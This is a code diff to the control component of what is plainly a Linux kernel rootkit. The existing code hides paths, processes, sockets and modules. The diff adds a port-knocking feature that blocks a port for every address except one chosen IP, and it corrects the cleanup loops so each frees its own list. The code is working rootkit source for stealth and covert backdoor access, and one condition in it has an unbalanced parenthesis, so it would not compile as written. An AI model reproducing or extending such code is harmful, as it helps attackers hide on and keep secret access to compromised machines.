@@ -41,7 +41,15 @@ struct udp_socket {
 struct modules {
 	struct list_head list;
 	char name[64];
-}; 
+};
+
+/* list for ports with enabled port knocking */
+struct port_knocking {
+	struct list_head list;
+	int port;		/* the port that is filtered */
+	int protocol;	/* tcp or udp */
+	int ipaddr;		/* the ip that is allowed to connect */
+};
 
 static struct list_head paths;
 static struct list_head prefixes;
@@ -49,6 +57,7 @@ static struct list_head processes;
 static struct list_head tcp_sockets;
 static struct list_head udp_sockets;
 static struct list_head modules;
+static struct list_head port_knocking_enabled;
 
 int
 is_path_hidden(char *name)
@@ -406,6 +415,70 @@ unhide_module(char *name)
 	return -EINVAL;
 }
 
+int
+is_port_filtered(int port, int protocol, int ipaddr)
+{
+	struct port_knocking *cur;
+	struct list_head *cursor;
+
+	list_for_each(cursor, &port_knocking_enabled) {
+		cur = list_entry(cursor, struct port_knocking, list);
+		/* if port and protocol match (but not ipaddr), filter it */
+		if(cur->port == port
+			&& cur->protocol == protocol)
+			&& cur->ipaddr != ipaddr) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+int
+filter_port(int port, int protocol, __u32 ipaddr)
+{
+	struct port_knocking *new;
+	
+	if(ipaddr == 0x00000000) {	/* illegal/reserved ipaddr */
+		return -EINVAL;
+	}
+	
+	if(is_port_filtered(port, protocol, 0x00000000)) {
+		return -1;	// TODO: better error code
+	}
+
+	new = kmalloc(sizeof(struct port_knocking), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+	new->protocol = protocol;
+	new->ipaddr = ipaddr;
+
+	list_add(&new->list, &port_knocking_enabled);
+	
+	return 0;
+}
+
+int
+unfilter_port(int port, int protocol)
+{
+	struct port_knocking *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &port_knocking_enabled) {
+		cur = list_entry(cursor, struct port_knocking, list);
+		if(cur->port == port
+			&& cur->protocol == protocol) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	return -EINVAL;
+}
+
 void
 initialize_control(void)
 {
@@ -417,6 +490,7 @@ initialize_control(void)
 	INIT_LIST_HEAD(&tcp_sockets);
 	INIT_LIST_HEAD(&udp_sockets);
 	INIT_LIST_HEAD(&modules);
+	INIT_LIST_HEAD(&port_knocking_enabled);
 
 	ROOTKIT_DEBUG("Done.\n");
 }
@@ -433,6 +507,7 @@ cleanup_control(void)
 	struct tcp_socket *tcp;
 	struct udp_socket *udp;
 	struct modules *module;
+	struct port_knocking *knocked_port;
 	
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &paths) {
@@ -442,38 +517,45 @@ cleanup_control(void)
 	}
 	
 	cursor = next = NULL;
-	list_for_each_safe(cursor, next, &paths) {
+	list_for_each_safe(cursor, next, &prefixes) {
 		prefix = list_entry(cursor, struct file_prefix, list);
 		list_del(cursor);
 		kfree(prefix);
 	}
 	
 	cursor = next = NULL;
-	list_for_each_safe(cursor, next, &paths) {
+	list_for_each_safe(cursor, next, &processes) {
 		process = list_entry(cursor, struct process, list);
 		list_del(cursor);
 		kfree(process);
 	}
 	
 	cursor = next = NULL;
-	list_for_each_safe(cursor, next, &paths) {
+	list_for_each_safe(cursor, next, &tcp_sockets) {
 		tcp = list_entry(cursor, struct tcp_socket, list);
 		list_del(cursor);
 		kfree(tcp);
 	}
 	
 	cursor = next = NULL;
-	list_for_each_safe(cursor, next, &paths) {
+	list_for_each_safe(cursor, next, &udp_sockets) {
 		udp = list_entry(cursor, struct udp_socket, list);
 		list_del(cursor);
 		kfree(udp);
 	}
 	
 	cursor = next = NULL;
-	list_for_each_safe(cursor, next, &paths) {
+	list_for_each_safe(cursor, next, &modules) {
 		module = list_entry(cursor, struct modules, list);
 		list_del(cursor);
 		kfree(module);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &port_knocking_enabled) {
+		knocked_port = list_entry(cursor, struct port_knocking, list);
+		list_del(cursor);
+		kfree(knocked_port);
 	}
 
 	ROOTKIT_DEBUG("Done.\n");
